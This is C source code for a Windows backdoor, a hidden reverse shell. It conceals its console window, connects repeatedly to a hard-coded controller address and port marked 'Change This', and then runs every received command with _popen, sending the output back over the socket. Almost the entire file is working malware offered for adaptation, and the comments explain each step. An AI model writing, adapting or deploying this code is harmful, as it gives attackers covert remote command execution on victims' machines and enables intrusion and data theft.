#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#define bzero(p,size) (void) memset((p), 0 , (size))

//Global Values
int sock;


//Function lists


void Shell()
{
	char buffer[1024]; // recv command
	char container[1024]; // store output chunk
	char total_response[18384]; // store total output

	while (1)
	{
		jump:
		bzero(buffer,sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, sizeof(buffer),0);
		if (strncmp("quit",buffer,4) ==0 )
		{
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else 
		{
			FILE *fp; //Create File Descriptor
			fp = _popen(buffer,"r"); //read command from buffer and execute it
			while (fgets(container,sizeof(container),fp)!=NULL) // while there's more data inside file descriptor
			{
				strcat(total_response,container); //add output to total container
			}
			send(sock,total_response,sizeof(total_response),0);
			fclose(fp);
		}
	}
}

/*This function serves as an entry point for WinAPI 
hInstace : Handle to an instance/module. Used to identify executables by the OS when loaded in memory. It is also needed by some windows functions.
hPrev : Used originally in 16 bit Windows. It's usually zero nowadays.
lpCmdLine : Contains Command line arguments
nCmdShow : Flag which determines window appearance(Minimized/Maximized/Normal)*/

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev , LPSTR lpCmdLine, int nCmdShow)
{
	//Hide Window
	HWND stealth; //stealth handle to make windows invisible
	AllocConsole(); //Allocate new console to the calling process
	stealth = FindWindowA("ConsoleWindowClass",NULL); //FindWindowA() returns a window handle (HWND) to the window that has the specified class name and window name. Here it is used while omitting the name (second argument) and specifying only the class, for which only a single window could exist in this case of a console window, the class of which is "ConsoleWindowClass"
	ShowWindow(stealth,0); //Hide Window. The second parameter(0) is analogus to nCmdShow.

	//Create Socket Objects For backdoor
	struct sockaddr_in ServAddr; //Socket Object
	unsigned short ServPort; //Server Port
	char *ServIP; //Pointer to address containing IP
	WSADATA wsaDATA; //Structure which contains information about Windows sockets

	ServIP = "192.168.56.1"; //IP : Change This
	ServPort = 8888; //Port : Change This
	if (WSAStartup(MAKEWORD(2,0), &wsaDATA) != 0) // The WSAStartup function initiates use of the Winsock DLL by a process.MAKEWORD(2,0) requests  for version 2.2 of Winsock on the system, and sets the passed version as the highest version of Windows Sockets support that the caller can use. The WSAStartup function returns 0 if successful else not
	{
		exit(1);
	}

	//Define Socket Object
	sock = socket(AF_INET,SOCK_STREAM,0); //Aah! I already miss python
	memset(&ServAddr,0, sizeof(ServAddr)); //Clears Memory
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP); //Convert String to IP-type values
	ServAddr.sin_port = htons(ServPort); //The htons() function converts the unsigned short integer hostshort from host byte order to network byte order

	//Attempt a connection Every 10 seconds
	while (connect(sock,(struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
	}

	//Execute Commands
	Shell();

}
